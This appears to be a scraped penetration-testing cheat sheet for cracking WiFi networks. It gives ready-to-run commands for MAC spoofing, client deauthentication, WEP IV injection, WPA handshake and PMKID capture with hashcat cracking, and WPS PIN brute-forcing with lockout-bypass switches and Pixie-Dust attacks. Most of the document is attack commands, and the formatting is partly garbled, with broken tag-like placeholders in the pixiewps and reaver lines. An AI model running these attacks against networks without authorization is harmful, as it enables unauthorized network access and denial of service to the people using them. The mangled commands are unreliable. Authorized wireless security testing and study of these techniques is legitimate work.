# WiFi Cracking

### General Informations

# Bypass MAC filter

macchanger –m B0:D0:9C:5C:EF:86 wlan0

### Monitoring, Recon and Dumping

Using the aircrack-ng suite
Turning on the monitor mode
`sudo airmon-ng start wlan0mon`

# Simple passive listening and capture

# Used to discover AP in the environment

sudo airodump-ng wlan0mon

# Targetted listening and capture

# Focus on one AP and one channel

sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile

### Attacking WEP

> # WEP is an old encryption protocol but still used in some places
> 
> # It is vulnerable to direct cracking attacks
> 
> # The only requirement is to get enough IV
> 
> # The process can be enhanced by sending deauth packets
> 
> # -0 == detauth attack, sending 3 packets (can be increased)

aireplay-ng -0 3 -a &lt;TARGET\_AP\_MAC&gt; wlan0mon -w

```
Another possibility is to use fake authentication to generate IV
Siwtches -10eah

1 = fake authentication
0 = delay between association demands
e = AP ESSID (name)
a = AP MAC
h = attacker MAC

aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon
```

ARP Sniffing and injection is another method

aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon

Using aircrack-ng it is possible to directly crack the WEP Key
`aircrack-ng outfile -w wordlist`

Using the aircrack-ng suite
You can first focus one AP using airodump-ng (see monitoring section)
Here, you want to get the 4-way WPA Handshake
It requires network traffic between the AP and one device

#### Dumping

`sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile`

#### Deauth connected devices to initiate authentication process and try to get the handshake

```
aireplay-ng --deauth 15 -a <TARGET_AP_MAC> wlan0mon
aireplay-ng -0 15 -a <TARGET_AP_MAC> wlan0mon 
```

⧉ Copied!

```
In the airodump-ng console, the WPA handshake will appear once captured 
```

Cracking can be done using aircrack-ng
`aircrack-ng outfile -w wordlist`

```
But also using other tools like hashcat.The outfile needs to be an HCCAPX file
Hashcat utils provide a binary to convert 
```

.
`cap2hccapx.exe WPA2_test.cap-01.cap WPA2_test.hccapx`

#### Then you can crack it like a normal hash (see hashcat section)

.\\hashcat64.exe -m 2500 WPA2_test.hccapx wordlist.txt --force -O

#### Attacking WPA2 using PMKID

#### You don't need any network traffic

#### Using hcxtools and hcxdumptool

#### Monitor mode

sudo airmon-ng start wlan0mon

#### PMKID capture

#### It can take a while to capture PKMID (several minutes++)

#### If an AP recieves our association request packet and supports sending

sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1

#### Then convert the captured data to a suitable format for hashcat

#### -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)

#### -I retrieve identities from WiFi-traffic

#### -U retrieve usernames from WiFi-traffic

sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng

#### Then, you can use hashcat to crack it (see hashcat section)

./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'

#### Attacking WPS (WiFi Protected Setup)

#### Reaver Attack

#### Online bruteforcing of the WPS 8-digits PIN

#### Kinda old and can be obsolete nowadays, but still usable

#### Reaver integrated dumping tool (can also airodump-ng)

#### Wash gives information about WPS being locked or not

#### Locked WPS will have less success chances

wash -i wlan0mon

####\ Launching reaver
reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv

#### Some manufacturers have implemented protections

#### You can try different switches to bypass

#### -L = Ignore locked state

#### -N = Don't send NACK packets when errors are detected

#### -d = delay X seconds between PIN attempts

#### -T = set timeout period to X second (.5 means half second)

#### -r = After X attemps, sleep for Y seconds

reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv -L -N -d 15 -T .5 -r 3:15

#### Pixie-Dust Attack

#### Done with Reaver + PixieWPS

#### This attack is based on seed / false random

#### Start reaver, we need the PKE, PKR, e-hash 1 & e-hash 2, E-nonce / R-nonce

#### and the authkey from Reaver to use for pixiewps

reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv -S

#### Now using pixiexps, you can crack PIN offline

pixiewps -e <pke>-r <pkr>-s <e-hash1>-z <e-hash2>-a <authkey>-n</authkey></e-hash2></e-hash1></pkr></pke>

#### Then, you can use the PIN with reaver to get to cleartext password

reaver -i <monitor interface="">-b <bssid>-c <channel>-p</channel></bssid></monitor>

#### Bettercap Pwning (https://www.bettercap.org/modules/) {#bettercap-pwning-httpswwwbettercaporgmodules}

#### Deauth and 4-way handshake attack

sudo bettercap -iface wlan0

# Start the monitoring mode

> wifi.recon on

# Set the AP sorting by clients number

> set wifi.show.sort clients desc

# Every 1 sec, clear view and display an updated one

> set ticker.commands 'clear; wifi.show'
> ticker on

# Set the target channel

> wifi.recon.channel 1

# Initiate deauth packets

> wifi.deauth e0:xx:xx:xx:xx:xx

# Client-less PMKID Attack

# PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC\_AP | MAC\_STA)

sudo bettercap -iface wlan0

# Start the monitoring mode

> wifi.recon on

# As long as the PMK is constant, we just need to get one to initiate attack

# Instead of deauth others, we will associate to the AP and listen which one

# Send good informations

# wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth
